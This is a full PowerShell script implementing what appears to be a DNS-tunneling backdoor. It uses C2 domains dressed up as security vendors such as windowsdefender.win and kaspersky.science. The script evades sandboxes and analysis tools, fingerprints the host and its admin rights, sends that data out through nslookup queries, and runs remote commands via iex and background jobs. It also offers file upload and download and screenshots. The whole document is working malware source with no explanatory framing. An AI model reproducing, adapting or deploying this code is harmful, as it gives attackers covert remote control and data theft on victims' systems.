$ErrorActionPreference = "silentlycontinue"
$Global:domainList = "anyconnect.stream","bigip.stream","fortiweb.download","kaspersky.science","microtik.stream","owa365.bid","symanteclive.download","windowsdefender.win"
$Global:domain = $Global:domainList[0]
$Global:server = ''
$Global:min_query_size = 30
$Global:max_query_size = 43
$Global:sleep = 3
$Global:jitter = 20
$Global:id = ''
$Global:hasGarbage = "0";
$Global:hasstartup = "0";
$Global:powershellScripts = New-Object Collections.ArrayList
$win7 = $false
$Global:sleepPerRequest = 1;
$Global:max_request = 100;
$Global:request_counter = 0;
$Global:queryTypes = "A","AAAA","AC","CNAME","MX","TXT","SRV","SOA";
$Global:mode =  "";
$Global:hybridMode =  $true;
$Global:useAC = $false;
$Global:queryTimeout = 5;
function sandbox()
{
	$memorySizeLimit = 2900000000
	$queries = New-Object System.Collections.ArrayList
	$queries.Add("select * from win32_BIOS where SMBIOSBIOSVERSION LIKE '%VBOX%'") | Out-Null
	$queries.Add("select * from win32_BIOS where SMBIOSBIOSVERSION LIKE '%bochs%'") | Out-Null
	$queries.Add("select * from win32_BIOS where SMBIOSBIOSVERSION LIKE '%qemu%'") | Out-Null
	$queries.Add("select * from win32_BIOS where SMBIOSBIOSVERSION LIKE '%VirtualBox%'") | Out-Null
	$queries.Add("select * from win32_BIOS where SMBIOSBIOSVERSION LIKE '%VM%'") | Out-Null
	foreach ($query in $queries)
	{
		$result = ''; Clear-Variable result;
		$result = Get-WmiObject -Query $query
		if ($result)
		{
			Write-Host "Virtual Machine Founded." -ForegroundColor Red
			
		}
	}
	$query = "Select * from win32_BIOS where Manufacturer LIKE '%XEN%'"
	$result = Get-WmiObject -Query $query
	if ($result) {Write-Host "Virtual Machine Founded." -ForegroundColor Red;  }
	$result = Get-WmiObject -Query "Select TotalPhysicalMemory from Win32_ComputerSystem" | Out-String
	$result = [regex]::Match($result,"TotalPhysicalMemory : (\d+)")
	$memory = $result.Groups[1].Value
	if ([int64]$memory -lt [int64]$memorySizeLimit)
	{
		exit
	}
	$cpuCoreNumber = gwmi -Class win32_Processor | select NumberOfCores | Out-String
	$cpuCoreNumber = [regex]::Match($cpuCoreNumber,".*(\d+)")
	$cpuCoreNumber = $cpuCoreNumber.Groups[1].Value
	if ($cpuCoreNumber -le 1)
	{
	    exit
	}
	$procList = Get-Process | select Company
	$result = ""
	if ($procList -match "Wireshark")
	{
		exit
	}
	if ($procList -match "Sysinternals")
	{
		exit
	}
}
sandbox

$os = gwmi -class win32_OperatingSystem | ft version -HideTableHeaders | Out-String; $os = $os.Trim();
$var = $os.Split('.')
if ([int]$var[0] -eq 6)
{
	if([int]$var[1] -lt 3)
	{
		$win7 = $false
	}
}
function myInfo()
{
    $IP = $(ipconfig | where { $_ -match 'IPv4.+\s(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})' } | out-null; $Matches[1])
    $domain = (gwmi -Query "Select Domain from win32_ComputerSystem" | ft Domain -HideTableHeaders | Out-String).Trim()
    $username = $env:USERNAME
	$computername = $env:COMPUTERNAME
	$is_admin = is_admin; $hybdrid;
	if ($Global:hybridMode){ $hybdrid = '1' } else { $hybdrid = '0' }
	return [string]$IP + '|' + [string]$computername + '|' + [string]$domain + '|' + [string]$username + '|' + [string]$is_admin + "|" + $Global:hasGarbage+ "|" + $Global:hasstartup + "|" + $hybdrid + "|" + $Global:sleep + "|" + $Global:jitter
}

function is_admin() {
	$is_admin = '00';$admins='';$domainAdmins='';$user='';$administrators='';
	try{$admins = net localgroup Administrators}catch{$admins=''}
	try{$domainAdmins = net group 'domain admins'}catch{$domainAdmins=''}
	try{$user = Get-LocalUser -Name $env:USERNAME}catch{$user=''}
	try{$administrators = Get-ADGroupMember "Administrators" | select name}catch{$administrators=''}
	if ($admins -contains $env:USERNAME) {
		$is_admin = '10'
	}
	if ($domainAdmins -contains $env:USERNAME) {
		$is_admin = '11'
	}
	if ($user.SID.Value -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-512') {
		$is_admin = '11'
	}
	if ($administrators -match $env:USERNAME) {
		$is_admin = '11'
	}
    if ($domainAdmins -and $is_admin -eq '00')
    {
        $is_admin = '01'
    }
	return $is_admin
}
function test($type='ALL', $jobID="2", $waiting=120)
{
	if ($waiting -gt 7200 )
	{
		exit
	}
	$testsResult = New-Object Collections.ArrayList
	if ($type -eq 'ALL')
	{
		$first_successfull_mode = "";
		foreach ($t in $Global:queryTypes)
		{
			$response= "";
			if ($Global:id.Length -ge 1)
			{
				$response = query -query $Global:id -type $t -test $true -change_mode $false
			}else {$response = query -query $PID -type $t -test $true -change_mode $false }

			if ($response -eq $false){$testsResult.Add("$t|0")} else{$testsResult.Add("$t`:1")}
			if ($response -ne $false -and $Global:id.Length -lt 1)
			{
				$Global:mode = $t;
				$first_successfull_mode = $t;
				try{
					$id = magic -data $response -state 'getid'
					if ($id -eq 0 -or $id -eq '0'){ continue; }
					$Global:id = $id;
				}catch{
					$Global:id = "";
					test;
					return;
				}
			}

		}
		if ($Global:id.Length -lt 1)
		{
			sleep -Seconds $waiting
			test -waiting ($waiting*2)
			return;
		}
		$Global:mode = $first_successfull_mode;
		$testsResult = $testsResult -join '|'
		spliting -data $testsResult -b64 $true -jobID $jobID
	}
	else{
		foreach ($t in $type)
		{
			$response = query -query $Global:id -type $t -test $true -change_mode $false
			if ($response -eq $false){$testsResult.Add("$t|0")} else{$testsResult.Add("$t`:1")}
		}
		$testsResult = $testsResult -join '|'
		spliting -data $testsResult -b64 $true -jobID $jobID
	}
}
function setsleep()
{
    [float]$temp = [float]$Global:jitter * [float]$Global:sleep / 100.0;
	$temp = Get-Random -Minimum -$temp -Maximum $temp
    [float]$slp = [float]$temp + [float]$Global:sleep
    Start-Sleep $slp
}
function roundRobin([Array]$list,[string]$current){
	$index = $list.IndexOf($current);
	$index++;
	if ($index -ge $list.Length)
	{
		$index = 0;
	}
	return $list[$index]
}
function query($query=$Global:id, $type=$Global:mode, $test=$false, $change_mode=$Global:hybridMode){
	$check = $false;
	$result = ""; clear-variable result;

	do{
		$Global:request_counter++;
		if ($Global:request_counter -gt $Global:max_request)
		{
			sleep -Seconds $Global:sleepPerRequest
			$Global:request_counter = 0;
		}
		try{
			ipconfig /flushdns
			$Global:domain = roundRobin -list $Global:domainList -current $Global:domain
			if ($change_mode) { $Global:mode = roundRobin -list $Global:queryTypes -current $Global:mode }

			else { $Global:mode = $type }
			$tempMode= $Global:mode;
			if ($tempMode.ToLower() -eq 'ac')
			{
				$Global:useAC = $true;
				$tempMode = 'a';
			}else{ $Global:useAC = $false; }
			$parameters = "-q=$tempMode $query.$Global:domain $Global:server"
			if ($Global:useAC)
			{
				$parameters = "-timeout=$Global:queryTimeout -q=$tempMode $query.ac.$Global:domain $Global:server"
			}
			$result = iex "nslookup.exe $parameters"
			$check = $true;
            if ($result -match 'timeout' -or $result -imatch 'UnKnown can' -or $result -imatch 'Unspecified error' ){$check = $false}
			if ($result -imatch 'canonical name' -or $result -imatch 'mx'-or $result -imatch 'namerserver'-or $result -imatch 'mail server'-or $result -imatch 'address'){$check=$true}
			if ($result -match '00900' -or $result -match '1.2.9.\d+' -or $result -match '2200::'){ return "cancel"}
		}catch{
			$check = $false;
			if ($test)
			{
				return $false;
			}
		}
		if ($test -and $check -eq $false)
		{
			return $false;
		}
		setsleep
	}while(-not $check)
	return $result
}

function insertGarbage($data)
{
	$string = (48..57) + (97..122) + '=' + '/'
	$ut8 = [System.Text.Encoding]::UTF8.GetBytes($data)
	$b64 = [System.Convert]::ToBase64String($ut8)
    if ($Global:hasGarbage -eq "1")
    {
        for ($i = 2; $i -lt $b64.Length; $i += 3) {
            $var = Get-Random $string | % { [char]$_ }
            $b64 = $b64.Insert($i, $var)
        }
    }
	return $b64
}
function removeGarbage($b64)
{
	$result = ''
	if ($Global:hasGarbage -eq "1")
    {
	    $b64 = $b64 -split ''
        for ($i = 2; $i -lt $b64.Length; $i += 3)
        {
            if ($b64[$i+1]) { $b64[$i + 1] = ''}
            else { break; }
        }
	    $b64 = $b64 -join ''
    }
	$data = [System.Convert]::FromBase64String($b64)
	$data = [System.Text.Encoding]::UTF8.GetString($data)
	return $data
}
function spliting($data,$b64=$true,$jobID=0)
{
	if ($jobID -eq 0)
	{
		return;
	}
    if ($data.length -lt  1)
    {
        $data = "empty"
    }
	if ($b64)
	{
		$data = insertGarbage -data $data
	}
	$answers = New-Object System.Collections.ArrayList; $answers.Add('*') | Out-Null
	$offset = 0
	$length = 0
	$is_more = 0
	while ($true)
	{

		$randomSize = Get-Random -Minimum $Global:min_query_size -Maximum $Global:max_query_size
		if (([int]$offset + [int]$Global:max_query_size) -ge [int]($data.Length-1))
		{
			break;
		}
		$splitedString = ($data[$offset..($offset+$randomSize)]) -join ''
		$length = $randomSize
		$offset = $offset + $randomSize + 1
		$is_more = 1;
		$queryData = "$Global:id-$jobID-$offset$is_more-$splitedString"
		$crc = $false;
		$ans = "";Clear-Variable ans;
		do{
			$ans = query -query $queryData
			if ($ans -eq 'cancel') { return }
			if ($ans -match "ok" -and $Global:mode.ToLower() -ne 'a' )
			{
				$crc = $true;
			}
			elseif (($Global:mode.ToLower() -eq 'a'-or $Global:mode.ToLower() -eq 'ac') -and $ans -match '1.1.1.\d+'){
				$crc = $true;
			}elseif ($Global:mode.ToLower() -eq 'aaaa' -and $ans -match '2a00::') { $crc = $true; }
		}while(-not $crc)
		$answers.Add($ans) | Out-Null
	}
	$is_more= 0
	$splitedString = ($data[$offset..($data.Length-1)]) -join ''
	$offset = $data.length;
	$queryData = "$Global:id-$jobID-$offset$is_more-$splitedString"
	$crc = $false;
	$ans = "";Clear-Variable ans;
	do{
		$ans = query -query $queryData
		if ($ans -eq 'cancel') { return }

		if ($ans -match 'ok' -and ($Global:mode.ToLower() -ne 'a' -or $Global:mode.ToLower() -ne 'ac'))
		{
			$crc = $true;
		}
		elseif (($Global:mode.ToLower() -eq 'a' -or $Global:mode.ToLower() -eq 'ac' )  -and $ans -match '1.1.1.\d+'){
			$crc = $true;
		}elseif ($Global:mode.ToLower() -eq 'aaaa' -and $ans -match '2a00::') { $crc = $true; }
	}while(-not $crc)
	$answers.Add($ans) | Out-Null
	return $answers
}

function magic($data,$state)
{
	if ($Global:mode.ToLower() -eq 'ac' -and $Global:useAC -and $state -eq 'getjob')
	{
		$pattern = "\d+-\d+-(\d+)-([\w\d+/=]+)-\d-.ac.$Global:domain"
		$matches = [regex]::Matches($data,$pattern)
		if ($matches.count -ge 1)
		{
			$command = "";
			$offset = 0;
			$ismore = 1;
			for($i=1; $i -lt $matches.count ; $i++)
			{
				$command += $matches[$i].Groups[2].value
			}
			$command += $matches[0].Groups[2].value
			$offset = $matches[0].Groups[1].value
			$ismore = $offset[-1]
			$offset = $offset.remove($offset.length-1)
			return ($offset,$ismore,$command)
		}
		return 0;
	}
	if ($Global:mode.ToLower() -eq 'aaaa')
	{
		if ($state -eq 'getjob' -or $state -eq 'getid')
		{
			$pattern = "Address:\s+(([a-fA-F0-9]{0,4}:{1,4}[\w|:]+){1,8})"
			$regex = [regex]::Match($data,$pattern)
			if (-not $regex.success) { return 0; }
			$offset=0;$ismore="";$string="";
			$string = $regex.Groups[1].value
			$string = $string -split ':'
			$command = ""
			foreach ($num in $string)
			{
				$firstPart = $num[0] + $num[1]
				$secondPart = $num[2] + $num[3]
				if ($firstPart.length -lt 2 -or $firstPart -eq '7e'){ $ismore = 0; break; }
				$command += [char][Convert]::ToInt16($firstPart,16)
				$offset++;
				if ($secondPart -lt 2) { $ismore = 0; break; }
				$command += [char][Convert]::ToInt16($secondPart,16)
				$offset++;
			}
			if ($state -eq 'getid') { return $command }
			return ($offset,$ismore,$command)
			###########
		}
		if ($state -eq 'haveJob')
		{
			$pattern = "Address:\s+(([a-fA-F0-9]{0,4}:{1,2}){1,8})"
			$regex = [regex]::Match($data,$pattern)
			if (-not $regex.success) { return $false; }
			if ($regex.Groups[1].value -eq '2a00::')
			{
				return $false;
			}
			return $true;
		}
	}
	if ($Global:mode.ToLower() -ne 'a' -and $Global:mode.ToLower() -ne 'ac')
	{
		if ($state -eq 'getjob')
		{
			$pattern = "(\d+)-([\w\d/=+]{0,})\-.$Global:domain"
			$regex = [regex]::Match($data,$pattern)
			if (-not $regex.success){return 0;}
			$offset="";$ismore="";$string="";
			$offset = $regex.Groups[1].value
			$ismore = $offset[-1]
			$offset = $offset.remove($offset.length-1)
			$string = $regex.Groups[2].value

			return ($offset,$ismore,$string)
		}
		if ($state -eq 'getid')
		{
			$pattern = "(\d+)\-.$Global:domain"
			$regex = [regex]::Match($data, $pattern)
			if (-not $regex.success)
			{
				return 0;
			}
			return $regex.Groups[1].value
		}
	}
	else{
		$pattern = "Address:\s+(\d+.\d+.\d+.\d+)"
		$regex = [regex]::Matches($data,$pattern)
		if ($regex.count -ge 2)
		{
			$data = $regex[1].Groups[1].value
			$data = $data -split '\.'
			if ($state -eq 'getjob')
			{
				$ismore = 1;
				$offset = 0;
				$converted_data = "";
				for ($i = 0; $i -le 3; $i++)
				{
					if ($data[$i] -eq '255' )
					{
						$ismore = 0;
						break;
					}
					$converted_data += [char]([int]$data[$i])
					$offset++;
				}
				if ($offset -eq 0){$offset += 1;}
				return ($offset,$ismore ,$converted_data)
			}
			elseif ($state -eq 'getid')
			{
				return $data[0]
			}
		}
		else{
			return 0;
		}
	}
}
function gettingJob($jobID)
{
	$offset = 0;
	$cancel_flag = $false;
	$command = ""
	$chk = $true;
	do{
		$q = $Global:id+'-'+$jobID+'-'+$offset
		$getJob = query -query $q -type $Global:mode
		if ($getJob -eq 'cancel')
		{
			$cancel_flag = $true;
			break;
		}
		$job = magic -data $getJob -state 'getjob'
		if ($job -eq 0)
		{
			continue;
		}
		if ($getJob[0] -eq '0' -and $getJob[2] -eq '999' -and $Global:mode.ToLower()  -ne 'a' -and $Global:mode.ToLower()  -ne 'ac' -and $Global:mode.ToLower()  -ne 'aaaa')
		{
			$chk = $false;
			break;
		}

		Clear-Variable getjob
		if ($offset -eq $job[0] -and $Global:mode.ToLower() -ne 'a' -and $Global:mode.ToLower() -ne 'aaaa')
		{
			continue;
		}
		if($Global:mode.ToLower() -eq 'a' -or $Global:mode.ToLower() -eq 'aaaa'){$offset =([int]$offset) + ([int]$job[0])}else{$offset = $job[0]}
		$command += $job[2]
		$isMore = $job[1]
		if ($isMore -eq '0'){break;}
	}while ($isMore -ne '0')
	if ($cancel_flag -or $chk -eq $false){ return "cancel" }
	return $command
}
test
$ut8 = [System.Text.Encoding]::UTF8.GetBytes((myInfo))
$b64 = [System.Convert]::ToBase64String($ut8)
spliting -data $b64 -b64 $false -jobID '1' | Out-Null

while ($true)
{
    $scriptInvocation = (Get-Variable MyInvocation -Scope 0).Value
    $myPath =  (Split-Path $scriptInvocation.MyCommand.Path)
    if ( Test-Path "$myPath\System.IO.MemoryStream")
    {
        rm "$myPath\System.IO.MemoryStream"
    }
	$completedJobs = ''; Clear-Variable completedJobs
	$failedJobs = ''; Clear-Variable failedJobs
	$completedJobs = job | where {$_.State -eq 'Completed'}
	$failedJobs = job | where {$_.State -eq 'Failed'}
	foreach ($job in $completedJobs)
	{
		if ($job)
		{
			if ($job.Name -match 'job') {continue;}
			$answer = ''; Clear-Variable answer
			$answer = Receive-Job -Job $job -Keep | Out-String
			if ( -not $answer)
			{
				$command = '$answer = Receive-Job -Job $job 6>&1'
				if (-not $win7){iex $command}

			}
			$answer.Trim();
			$answer = $answer -replace '      ',' '
			$answer = $answer -replace '     ',' '
			$answer = $answer -replace '   ',' '
			spliting -data $answer -b64 $true -jobID $job.Name
			try{
			Remove-Job -Name $job.Name}catch{}
		}

	}
	foreach ($job in $failedJobs)
	{
		if($job)
		{
			if ($job.Name -match 'job') {continue;}
			$answer = ''; Clear-Variable answer
			$answer = Receive-Job  -Keep  -Job $job  | Out-String
			if ( -not $answer)
			{
				$command = '$answer = Receive-Job  -Keep  -Job $job 2>&1'
				if (-not $win7){iex $command}
			}
			if (-not $answer)
			{
				$answer = 'The job has been faild due to the some errors.'
			}
			$answer.Trim();
			$answer = $answer -replace '      ',' '
			$answer = $answer -replace '     ',' '
			$answer = $answer -replace '   ',' '
			spliting -data $answer -b64 $true -jobID $job.Name
			try{Remove-Job -Name $job.Name}catch{}
		}
	}
	$string =  (48..57) + (97..122)
	$garbage = ""
	for ($i=0; $i -le 2; $i++)
	{
		$var = Get-Random $string | % { [char]$_ }
        $garbage += $var
	}
	$garbage += "X"
	$answer = query -query "$Global:id-$garbage"
	$is_a_record = $false;
	$is_4a_record = $false;
	if ($Global:mode.ToLower() -ne 'a' -and $Global:mode.ToLower() -ne 'aaaa'  -and $Global:mode.ToLower() -ne 'ac') { $answer = [regex]::Match($answer,"(\d+)-.$Global:domain") }
	elseif ($Global:mode.ToLower() -eq 'aaaa')
	{
		$result = magic -data $answer -state 'haveJob'
		if ($result)
		{
			$pattern = "Address:\s+(([a-fA-F0-9]{0,4}:{1,2}){1,8})"
			$answer = [regex]::Match($answer,$pattern)
			$is_4a_record = $true;
		}
	}
	elseif ($Global:mode.ToLower() -eq 'a' -or $Global:mode.ToLower() -eq 'ac'){
		$answer = [regex]::Matches($answer,"Address:\s+\d+.\d+.\d+.\d+") # Add Pattern hear
		if ($answer.count -ge 2)
		{
			$answer  = [regex]::Match($answer[1],"Address:\s+1.1.(\d+.\d+)")
		}
		$is_a_record = $true;
	}
	$jobID = ""; Clear-Variable jobID;
	if ($answer.success)
	{
		$cancel_flag = $false;
		if ($is_4a_record)
		{
			$jobID = magic -data ("Address:  "+$answer.Groups[1].value) -state 'getid'
			if ($jobID -eq 0) { $cancel_flag = $true; continue;}
		}
		if ($is_a_record)
		{
			$answer = $answer.Groups[1].Value
			$answer = $answer -split '\.'
			$jobID = [string]([int]($answer[0]+$answer[1]))
		}elseif (-not $is_4a_record -and -not $is_a_record) {$jobID = $answer.Groups[1].Value}
		$command = "";Clear-Variable command;
		$command = gettingJob -jobID $jobID
		if ($command -eq 'cancel') { continue; }
		$command = $command.Trim();
		$command = removeGarbage -b64 $command


		if ($command -match '^\$fileDownload')
		{
			$filePath  = ($command -split '\n')[1]
			try{
				$fileContent = [Convert]::ToBase64String([IO.File]::ReadAllBytes($filePath))
				spliting -data $fileContent -b64 $false -jobID $jobID
			}
			catch{
				spliting -data ($Error[0].ToString()) -b64 $true -jobID $jobID
			}
			continue;
		}
		if (($command -split '`n')[0] -match '^\$importModule')
		{
			$Global:powershellScripts.Add($command) | Out-Null
			spliting -data "Sucessfull." -b64 $true -jobID $jobID
			continue;
		}
		if ($command -match '^\$screenshot'){
			iex $command
			continue
		}
		if ($command -match '^\$command')
		{
			try	{
				$com = iex $command | Out-String
				$com.Trim()
				$com = $com -replace '      ',' '
				$com = $com -replace '     ',' '
				$com = $com -replace '   ',' '
				if((($com -split '\n')[0]).Trim() -eq '$command')
				{
					$command = $command -split '\n'
					$com = $com -split '\n'
					for ($i=0; $i -lt $command.count; $i++){ $com[$i] = ""; }
					$com = $com -join ''
				}
				if ($com.length -lt 1)
				{
				    $com = "EMPTY"
				}
				spliting -data $com -b64 $true -jobID $jobID
				}
			catch{
				$body = ''; Clear-Variable body
				$body = $Error[0] | Out-String
				$body += 'Command Faild.'
				spliting -data $body -b64 $true -jobID $jobID
			}
			continue
		}
		if ($command -match '^slp:\d+')
		{
              $command.ToString()
              $command = $command.Split(':')[1]
              $command = $command.Split('-')
              $Global:sleep = [system.convert]::ToInt32($command[0])
              $Global:jitter = [system.convert]::ToInt32($command[1])
              spliting -data "OK" -b64 $true -jobID $jobID
              continue;
		}
		if ($command -match '^testmode')
		{
			$command = $command -replace 'testmode:', ''
			$command = $command -split ':'
			test -type $command -jobID $jobID
			continue;
		}
		if ($command -match "^showconfig")
		{
			$myConfig = ($Global:domainList -join '-')+ "|" +$Global:min_query_size + "|" + $Global:max_query_size+ "|" + $Global:hasGarbage + "|" +$Global:hasstartup +"|"+ $Global:sleepPerRequest + "|" + $Global:max_request + "|" + $Global:queryTypes -join '-' +"|"+$Global:hybridMode.ToString()
			$Global:hybridMode
			spliting -data $myConfig -b64 $true -jobID $jobID
			continue;
		}
		if ($command -match '^slpx:\d+')
		{
			$command = $command.split(':')[1];
			$Global:sleepPerRequest = [int] $command;
			spliting -data 'OK' -b64 -jobID $jobID
			continue;
		}
		if ($command -match '^\$fileUpload')
		{
			$filePath = ($command -split '\n')[1]
			$command = gettingJob -jobID $jobID
			if ($command -eq 'cancel') { continue; }
			$command = $command.Trim();
			try{
				[IO.File]::WriteAllBytes($filePath,([Convert]::FromBase64String($command)))
				spliting -data "True" -b64 $true -jobID $jobID
			}
			catch{
				spliting -data ($Error[0].ToString()) -b64 $true -jobID $jobID
			}
		continue;
		}
		$modules = $Global:powershellScripts -join '`n'
		$username = [regex]::Match(($command -split ("`n")[1]), '\$user=\"(.*)\"')
		$password = ''
		if ($username.success) {
			$password = [regex]::Match($command, '\$password=\"(.*)\"')
			$password = $password.Groups[1]
			$password = ConvertTo-SecureString $password.value -AsPlainText -Force
		}
		$modules += $command;
		$command = $modules;
		Clear-Variable modules
		$scriptBlock = [ScriptBlock]::Create($command)
		try{
		if ($username.success) {
			$username = $username.Groups[1]
			$credentials = New-Object System.Management.Automation.PSCredential($username.value , $password)
			Start-Job -Name $jobID -ScriptBlock $scriptBlock -Credential $credentials -InitializationScript { cd -Path "$env:APPDATA\"}
		}
		else { Start-Job -Name $jobID -ScriptBlock $scriptBlock -InitializationScript { cd -Path "$env:APPDATA\"} }
		}catch{
			$result = $Error[0] | Out-String
			$answer = spliting -data $result -jobID $jobID
		}
	}
}

